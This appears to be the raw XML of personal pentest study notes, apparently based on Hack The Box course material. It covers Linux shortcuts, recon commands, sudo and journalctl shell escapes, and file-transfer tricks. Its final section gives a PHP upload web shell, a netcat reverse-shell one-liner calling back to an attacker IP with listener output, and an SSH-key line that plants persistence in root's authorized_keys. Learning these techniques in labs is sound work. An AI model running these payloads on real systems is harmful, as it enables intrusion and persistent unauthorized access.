      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"><text:span text:style-name="T9">/ journalctl</text:span> </text:p>
      <text:p text:style-name="P40">Shell Sudo</text:p>
      <text:p text:style-name="P40">This invokes the default pager, which is likely to be less, other functions may apply.</text:p>
      <text:p text:style-name="P40">This might not work if run by unprivileged users depending on the system configuration.</text:p>
      <text:p text:style-name="P40">Shell</text:p>
      <text:p text:style-name="P40">It can be used to break out from restricted environments by spawning an interactive system shell.</text:p>
      <text:p text:style-name="P40">journalctl</text:p>
      <text:p text:style-name="P40">!/bin/sh</text:p>
      <text:p text:style-name="P40">Sudo</text:p>
      <text:p text:style-name="P40">If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</text:p>
      <text:p text:style-name="P40">sudo journalctl</text:p>
      <text:p text:style-name="P40">!/bin/sh</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P34"><text:span text:style-name="T11">&lt;&lt;&lt; END <text:s/>Permission Management</text:span>&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P49"><text:span text:style-name="T11">&lt;&lt;&lt; </text:span><text:span text:style-name="T19">Shortcuts </text:span>&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P45">Shortcuts</text:p>
      <text:p text:style-name="P41">There are many shortcuts that we can use to make working with Linux easier and faster. After we have familiarized ourselves with the most important of them and have made them a habit, we will save ourselves much typing. Some of them will even help us to avoid using our mouse in the terminal.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Auto-Complete</text:p>
      <text:p text:style-name="P41">[TAB] - Initiates auto-complete. This will suggest to us different options based on the STDIN we provide. These can be specific suggestions like directories in our current working environment, commands starting with the same number of characters we already typed, or options.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Cursor Movement</text:p>
      <text:p text:style-name="P41">[CTRL] + A - Move the cursor to the beginning of the current line.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41">[CTRL] + E - Move the cursor to the end of the current line.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41">[CTRL] + [←] / [→] - Jump at the beginning of the current/previous word.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41">[ALT] + B / F - Jump backward/forward one word.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Erase The Current Line</text:p>
      <text:p text:style-name="P41">[CTRL] + U - Erase everything from the current position of the cursor to the beginning of the line.</text:p>
      <text:p text:style-name="P41"><text:soft-page-break/></text:p>
      <text:p text:style-name="P41">[Ctrl] + K - Erase everything from the current position of the cursor to the end of the line.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41">[Ctrl] + W - Erase the word preceding the cursor position.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Paste Erased Contents</text:p>
      <text:p text:style-name="P41">[Ctrl] + Y - Pastes the erased text or word.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Ends Task</text:p>
      <text:p text:style-name="P41">[CTRL] + C - Ends the current task/process by sending the SIGINT signal. For example, this can be a scan that is running by a tool. If we are watching the scan, we can stop it / kill this process by using this shortcut. While not configured and developed by the tool we are using. The process will be killed without asking us for confirmation.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">End-of-File (EOF)</text:p>
      <text:p text:style-name="P41">[CTRL] + D - Close STDIN pipe that is also known as End-of-File (EOF) or End-of-Transmission.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Clear Terminal</text:p>
      <text:p text:style-name="P41">[CTRL] + L - Clears the terminal. An alternative to this shortcut is the clear command you can type to clear our terminal.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Background a Process</text:p>
      <text:p text:style-name="P41">[CTRL] + Z - Suspend the current process by sending the SIGTSTP signal.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Search Through Command History</text:p>
      <text:p text:style-name="P41">[CTRL] + R - Search through command history for commands we typed previously that match our search patterns.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41">[↑] / [↓] - Go to the previous/next command in the command history.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Switch Between Applications</text:p>
      <text:p text:style-name="P41">[ALT] + [TAB] - Switch between opened applications.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P45">Zoom</text:p>
      <text:p text:style-name="P41">[CTRL] + [+] - Zoom in.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41">[CTRL] + [-] - Zoom out.</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P35"><text:span text:style-name="T11">&lt;&lt;&lt; END <text:s/></text:span><text:span text:style-name="T19">Shortcuts</text:span>&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P50"><text:span text:style-name="T11">&lt;&lt;&lt; </text:span><text:span text:style-name="T20">Terminal</text:span><text:span text:style-name="T19"> </text:span>&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P41"><text:span text:style-name="T21">Command</text:span><text:tab/><text:span text:style-name="T21">Description</text:span></text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">whoami</text:span><text:tab/><text:tab/>Displays current username.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">id</text:span><text:tab/><text:tab/>Returns users identity</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">hostname</text:span><text:tab/>Sets or prints the name of current host system.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">uname</text:span><text:tab/><text:tab/>Prints basic information about the operating system name and system hardware.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">pwd</text:span><text:tab/><text:tab/>Returns working directory name.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">ifconfig</text:span><text:tab/><text:tab/>The ifconfig utility is used to assign or to view an address to a network interface and/or configure <text:tab/><text:tab/>network interface parameters.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">ip</text:span><text:tab/><text:tab/>Ip is a utility to show or manipulate routing, network devices, interfaces and tunnels.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">netstat</text:span><text:tab/><text:tab/>Shows network status.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">ss</text:span><text:tab/><text:tab/>Another utility to investigate sockets.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">ps</text:span><text:tab/><text:tab/>Shows process status.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">who</text:span><text:tab/><text:tab/>Displays who is logged in.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">env</text:span><text:tab/><text:tab/>Prints environment or sets and executes command.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">lsblk</text:span><text:tab/><text:tab/>Lists block devices.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">lsusb</text:span><text:tab/><text:tab/>Lists USB devices</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">lsof</text:span><text:tab/><text:tab/>Lists opened files.</text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T5">lspci</text:span><text:tab/><text:tab/>Lists PCI devices.</text:p>
      <text:p text:style-name="P38"><text:soft-page-break/></text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P20">ls</text:p>
      <text:p text:style-name="P27"><text:tab/>-lt =&gt; get all files sorted with last modified </text:p>
      <text:p text:style-name="P27"><text:tab/>-li &lt;filename&gt; Get inode naumber</text:p>
      <text:p text:style-name="P27">Uname</text:p>
      <text:p text:style-name="P27">Let's dig into the uname command a bit more. If we type man uname in our terminal, we will bring up the man page for the command, which will show the possible options we can run with the command and the results.</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">DESCRIPTION</text:p>
      <text:p text:style-name="P27"><text:s text:c="7"/><text:span text:style-name="T5">uname</text:span> <text:s/>print system information. <text:s/>With no OPTION, same as -s.</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-a, --all</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>print all information, in the following order, except omit -p and -i if unknown:</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-s, --kernel-name</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>print the kernel name</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-n, --nodename</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>print the network node hostname</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-r, --kernel-release</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>print the kernel release</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-v, --kernel-version</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>print the kernel version</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-m, --machine</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>print the machine hardware name</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-p, --processor</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>print the processor type (non-portable)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-i, --hardware-platform</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>print the hardware platform (non-portable)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="7"/>-o, --operating-system</text:p>
      <text:p text:style-name="P27">Running uname -a will print all information about the machine in a specific order: kernel name, hostname, the kernel release, kernel version, machine hardware name, and operating system. The -a flag will omit -p (processor type) and -i (hardware platform) if they are unknown.</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P20">Show network interfaces</text:p>
      <text:p text:style-name="P27">$ ip link show</text:p>
      <text:p text:style-name="P20">Show a table of all network interfaces using netstat command in Linux</text:p>
      <text:p text:style-name="P27">$ netstat -i</text:p>
      <text:p text:style-name="P20">Get Kernel version</text:p>
      <text:p text:style-name="P27">$ uname -r</text:p>
      <text:p text:style-name="P20">Get actual Shell</text:p>
      <text:p text:style-name="P27">$ <text:span text:style-name="T23">ec</text:span>ho $SHELL</text:p>
      <text:p text:style-name="P29">or</text:p>
      <text:p text:style-name="P28">$ env | grep SHELL</text:p>
      <text:p text:style-name="P21">Print something what is saved in the ENViroment variable ….</text:p>
      <text:p text:style-name="P27">$ env | grep &lt;...&gt;</text:p>
      <text:p text:style-name="P71">List all software</text:p>
      <text:p text:style-name="P58">$ dpkg -l</text:p>
      <text:p text:style-name="P72">Check sudo privileges</text:p>
      <text:p text:style-name="P59">$ sudo -l</text:p>
      <text:p text:style-name="P73">Switch to root user</text:p>
      <text:p text:style-name="P60">$ sudo su -</text:p>
      <text:p text:style-name="P74">Run sudo as other user</text:p>
      <text:p text:style-name="P57">$ sudo -u &lt;user&gt; /……<text:line-break/><text:soft-page-break/><text:span text:style-name="T22">Files</text:span></text:p>
      <text:p text:style-name="P56"><text:span text:style-name="T6">Write data from terminal in file (also if connected via shell) – her a ssh key</text:span></text:p>
      <text:p text:style-name="P62">$ echo "ssh-rsa A...SNIP...M= &lt;user&gt;@&lt;<text:span text:style-name="T24">host&gt;</text:span>" &gt;&gt; /root/.ssh/authorized_keys</text:p>
      <text:p text:style-name="P55"><text:span text:style-name="T24">Use ssh key in file</text:span></text:p>
      <text:p text:style-name="P62"><text:span text:style-name="T24">$ ssh &lt;user&gt;ł&lt;host&gt; -i &lt;key&gt;</text:span></text:p>
      <text:p text:style-name="P54">Start python http server</text:p>
      <text:p text:style-name="P65">$ python3 -m http.server 8000</text:p>
      <text:p text:style-name="P65">Download file </text:p>
      <text:p text:style-name="P78"><text:span text:style-name="T8">$ </text:span><text:span text:style-name="T7">wget</text:span><text:span text:style-name="T8"> http://10.10.14.1:8000/linenum.sh</text:span></text:p>
      <text:p text:style-name="P61">$ <text:span text:style-name="T5">curl</text:span> http://10.10.14.1:8000/linenum.sh -o linenum.sh</text:p>
      <text:p text:style-name="P61">Note that we used the -o flag to specify the output file name. </text:p>
      <text:p text:style-name="P61">Another method to transfer files would be using scp, granted we have obtained ssh user credentials on the remote host. We can do so as follows: </text:p>
      <text:p text:style-name="P78"><text:span text:style-name="T8">$ </text:span><text:span text:style-name="T7">scp</text:span><text:span text:style-name="T8"> linenum.sh user@remotehost</text:span><text:span text:style-name="T8">:/tmp/linenum.sh</text:span></text:p>
      <text:p text:style-name="P61">Note that we specified the local file name after scp, and the remote directory will be saved to after the :.</text:p>
      <text:p text:style-name="P74">Using Base64</text:p>
      <text:p text:style-name="P61">In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:</text:p>
      <text:p text:style-name="P61">$ base64 &lt;<text:span text:style-name="T25">file&gt;</text:span> -w 0</text:p>
      <text:p text:style-name="P63">Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file: </text:p>
      <text:p text:style-name="P63">$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d &gt; &lt;<text:span text:style-name="T25">file&gt;</text:span></text:p>
      <text:p text:style-name="P61">To validate the format of a file, we can run the file command on it:</text:p>
      <text:p text:style-name="P61">$ file shell</text:p>
      <text:p text:style-name="P61">shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header</text:p>
      <text:p text:style-name="P61">As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run md5sum on it:</text:p>
      <text:p text:style-name="P64"><text:span text:style-name="T25">$ </text:span>md5sum &lt;<text:span text:style-name="T25">file&gt;</text:span></text:p>
      <text:p text:style-name="P64">321de1d7e7c3735838890a72c9ae7d1d &lt;<text:span text:style-name="T25">file&gt;</text:span></text:p>
      <text:p text:style-name="P61">Now, we can go to the remote server and run the same command on the file we transferred:</text:p>
      <text:p text:style-name="P61">$ md5sum shell</text:p>
      <text:p text:style-name="P61">321de1d7e7c3735838890a72c9ae7d1d shell</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P75">Identify the web application in use</text:p>
      <text:p text:style-name="P66">$ whatweb &lt;ip adress&gt;</text:p>
      <text:p text:style-name="P67">$ whatweb &lt;ip adress&gt;/<text:span text:style-name="T26">page or dir</text:span></text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P74"><text:span text:style-name="T27">U</text:span>se Gobuster to be thorough and check for any other accessible pages/directories</text:p>
      <text:p text:style-name="P61">$ gobuster dir -u &lt;<text:span text:style-name="T27">ip adress&gt;</text:span>/<text:span text:style-name="T27">page or dir</text:span>/ --wordlist /usr/share/dirb/wordlists/common.txt</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P76">Prettify XML output using xmllint</text:p>
      <text:p text:style-name="P68">$ curl -s <text:s/>&lt;ip adress&gt; | xmllint –format - <text:s text:c="11"/></text:p>
      <text:p text:style-name="P68"/>
      <text:p text:style-name="P77">Test web code execution<text:span text:style-name="T29">b <text:s/>&amp; get reverse shell &amp; upgrade TTY shell</text:span></text:p>
      <text:p text:style-name="P69">&lt;?php system('id'); ?&gt;</text:p>
      <text:p text:style-name="P61">Save this code to a file and then click on the Browse button and upload it.</text:p>
      <text:p text:style-name="P61">Now we have to find out where the file uploaded if it was successful. <text:s/><text:span text:style-name="T28">(Tipp: last modified file)</text:span></text:p>
      <text:p text:style-name="P70">If succesfull and found the path perform:</text:p>
      <text:p text:style-name="P70">$ curl &lt;ip adress&gt;/path/to/uploaded/file/…...php</text:p>
      <text:p text:style-name="P70">Let us use the following Bash reverse shell one-liner and add it to our PHP script.</text:p>
      <text:p text:style-name="P70">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ATTACKING IP&gt; &lt;LISTENING PORT) &gt;/tmp/f</text:p>
      <text:p text:style-name="P70">We will add our tun0 VPN IP address in the &lt;ATTACKING IP&gt; placeholder and a port of our choice for &lt;LISTENING PORT&gt; to catch the reverse shell on our netcat listener. See the edited PHP script below.</text:p>
      <text:p text:style-name="P70">&lt;?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 9443 &gt;/tmp/f"); ?&gt;</text:p>
      <text:p text:style-name="P70">We upload the file again and start a netcat listener in our terminal:</text:p>
      <text:p text:style-name="P70">0xdf@htb[/htb]$ nc -lvnp 9443</text:p>
      <text:p text:style-name="P70">listening on [any] 9443 ...</text:p>
      <text:p text:style-name="P70">cURL the image page again or browse to it in Firefox at http:///nibbleblog/content/private/plugins/my_image/image.php <text:soft-page-break/>to execute the reverse shell.</text:p>
      <text:p text:style-name="P70">WKDMinerva@htb[/htb]$ nc -lvnp 9443</text:p>
      <text:p text:style-name="P70">listening on [any] 9443 ...</text:p>
      <text:p text:style-name="P70">connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106</text:p>
      <text:p text:style-name="P70">/bin/sh: 0: can't access tty; job control turned off</text:p>
      <text:p text:style-name="P70">$ id</text:p>
      <text:p text:style-name="P70">Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as su will not work, we cannot use text editors, tab-completion does not work, etc. This post explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a Python one-liner to spawn a pseudo-terminal so commands such as su and sudo work as discussed previously in this Module.</text:p>
      <text:p text:style-name="P70">python -c 'import pty; pty.spawn("/bin/bash")'</text:p>
      <text:p text:style-name="P70">Try the various techniques for upgrading to a full TTY and pick one that works best for you. Our first attempt fails as Python2 seems to be missing from the system!</text:p>
      <text:p text:style-name="P70">$ python -c 'import pty; pty.spawn("/bin/bash")'</text:p>
      <text:p text:style-name="P70">/bin/sh: 3: python: not found</text:p>
      <text:p text:style-name="P70">$ which python3</text:p>
      <text:p text:style-name="P70">/usr/bin/python3</text:p>
      <text:p text:style-name="P70">We have Python3 though, which works to get us to a friendlier shell by typing python3 -c 'import pty; pty.spawn("/bin/bash")'</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P36"><text:span text:style-name="T11">&lt;&lt;&lt; END <text:s/></text:span><text:span text:style-name="T20">Terminal</text:span>&gt;&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Consolas" svg:font-family="Consolas, Monaco, 'andale mono', 'ubuntu mono', monospac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4.1.2$Linux_X86_64 LibreOffice_project/40$Build-2</meta:generator>
    <dc:date>2022-10-10T21:33:15.521434478</dc:date>
    <meta:editing-duration>PT11H10M35S</meta:editing-duration>
    <meta:editing-cycles>66</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="12" meta:paragraph-count="453" meta:word-count="4918" meta:character-count="30853" meta:non-whitespace-character-count="25837"/>
  </office:meta>
</office:document-meta>
</file>